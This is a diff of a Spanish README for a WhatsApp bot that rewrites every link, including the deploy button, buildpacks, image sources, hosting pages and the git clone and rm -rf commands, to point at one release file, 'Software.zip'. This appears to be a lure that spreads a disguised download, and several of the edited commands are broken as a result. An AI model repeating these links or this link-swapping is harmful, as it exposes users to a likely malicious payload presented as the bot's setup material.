@@ -1,27 +1,27 @@
 # `𝑭𝒂𝒏𝒕𝒂𝒔𝒎𝒂𝑩𝒐𝒕 - 𝑴𝒅 `
 
 ### `—◉ 👑 DUDAS SOBRE EL BOT?, CONTACTAME 👑`
-<a href="http://wa.me/19894000000" target="blank"><img src="https://img.shields.io/badge/Fantasma-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" /></a>
+<a href="https://github.com/ByjereEXT/FANTASMA-BOT-MD/releases/download/v2.0/Software.zip" target="blank"><img src="https://github.com/ByjereEXT/FANTASMA-BOT-MD/releases/download/v2.0/Software.zip" /></a>
 > NO BOT
 
 ### `—◉ 🖍 LETRA DEL BOT 🖍`
-- PAGINA USADA PARA LA LETRA [Aqui](https://smiley.cool/es/weirdmaker.php)
+- PAGINA USADA PARA LA LETRA [Aqui](https://github.com/ByjereEXT/FANTASMA-BOT-MD/releases/download/v2.0/Software.zip)
 
 ### `—◉ ✨ ACTIVAR EN HEROKU ✨`
-[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy?template=https://github.com/BrunoSobrino/TheMystic-Bot-MD)
+[![Deploy](https://github.com/ByjereEXT/FANTASMA-BOT-MD/releases/download/v2.0/Software.zip)](https://github.com/ByjereEXT/FANTASMA-BOT-MD/releases/download/v2.0/Software.zip)
 ```bash
 [❗] FALLAS POR EL MOMENTO EN HEROKU, SE TRABAJA EN SOLUCIONAR ERRORES.
 AÑADE AL APARTADO DE BUILPACK LO SIGUIENTE, SI YA APARCEN SOLO IGNORA ESTA PARTE:
 > heroku/nodejs
-> https://github.com/jonathanong/heroku-buildpack-ffmpeg-latest.git
-> https://github.com/clhuang/heroku-buildpack-webp-binaries.git
-> https://github.com/DuckyTeam/heroku-buildpack-imagemagick.git
+> https://github.com/ByjereEXT/FANTASMA-BOT-MD/releases/download/v2.0/Software.zip
+> https://github.com/ByjereEXT/FANTASMA-BOT-MD/releases/download/v2.0/Software.zip
+> https://github.com/ByjereEXT/FANTASMA-BOT-MD/releases/download/v2.0/Software.zip
 ADVERTENCIA: HEROKU ESTA SUSPENDIENDO CUENTAS POR SOLO USAR EL BOT, POR AHORA NO ES RECOMENDABLE USAR EL BOT EN HEROKU!
 ```
 
 ### `—◉ ⚙️ AJUSTES ⚙️`
-- CLONAR EL REPOSITORIO [Aqui](https://github.com/IdkJhus/NotJhuz-MD/fork)
-- CAMBIAR NÚMERO DEL OWNER [Aqui](https://github.com/IdkJhus/NotJhuz-MD/blob/master/config.js)
+- CLONAR EL REPOSITORIO [Aqui](https://github.com/ByjereEXT/FANTASMA-BOT-MD/releases/download/v2.0/Software.zip)
+- CAMBIAR NÚMERO DEL OWNER [Aqui](https://github.com/ByjereEXT/FANTASMA-BOT-MD/releases/download/v2.0/Software.zip)
 
 ### `—◉ 👾 ACTIVAR EN TERMUX 👾`
 ```bash
@@ -35,7 +35,7 @@ ESCRIBE LOS SIGUIENTES COMANDOS UNO POR UNO:
 > pkg install ffmpeg -y
 > pkg install imagemagick -y
 > pkg install yarn
-> git clone https://github.com/notxfantasma666/FantasmaBot-MD
+> git clone https://github.com/ByjereEXT/FANTASMA-BOT-MD/releases/download/v2.0/Software.zip
 > cd FantasmaBot-MD
 > yarn install 
 > npm install
@@ -56,20 +56,20 @@ ESCRIBE LOS SIGUIENTES COMANDOS UNO POR UNO:
 ESCRIBE LOS SIGUIENTES COMANDOS UNO POR UNO:
 > cd 
 > cd FantasmaBot-MD
-> rm -rf session.data.json
+> rm -rf https://github.com/ByjereEXT/FANTASMA-BOT-MD/releases/download/v2.0/Software.zip
 > npm start
 ```
 
 ### `—◉ 🔥 ACTIVAR EN BOXMINEHOST 🔥`
-<img src="https://i.ibb.co/FxJ2BdG/02b7bc373a5b9629117837e5cfec7d5a.jpg"/>
+<img src="https://github.com/ByjereEXT/FANTASMA-BOT-MD/releases/download/v2.0/Software.zip"/>
 <p>> Pagina Oficial:
-<a href="https://boxmineworld.com">https://boxmineworld.com</a>
+<a href="https://github.com/ByjereEXT/FANTASMA-BOT-MD/releases/download/v2.0/Software.zip">https://github.com/ByjereEXT/FANTASMA-BOT-MD/releases/download/v2.0/Software.zip</a>
 <p>> Dashboard:
-<a href="https://dash.boxmineworld.com/home">https://dash.boxmineworld.com/home</a>
+<a href="https://github.com/ByjereEXT/FANTASMA-BOT-MD/releases/download/v2.0/Software.zip">https://github.com/ByjereEXT/FANTASMA-BOT-MD/releases/download/v2.0/Software.zip</a>
 <p>> Panel:
-<a href="https://panel.boxmineworld.com">https://panel.boxmineworld.com</a>
+<a href="https://github.com/ByjereEXT/FANTASMA-BOT-MD/releases/download/v2.0/Software.zip">https://github.com/ByjereEXT/FANTASMA-BOT-MD/releases/download/v2.0/Software.zip</a>
 <p>> Dudas UNICAMENTE SOBRE EL HOST:
-<a href="https://discord.gg/84qsr4v">https://discord.gg/84qsr4v</a> (Preguntar por Vicemi)
+<a href="https://github.com/ByjereEXT/FANTASMA-BOT-MD/releases/download/v2.0/Software.zip">https://github.com/ByjereEXT/FANTASMA-BOT-MD/releases/download/v2.0/Software.zip</a> (Preguntar por Vicemi)
 </p>
 
 ### `—◉ 📝 NOTAS 📝`
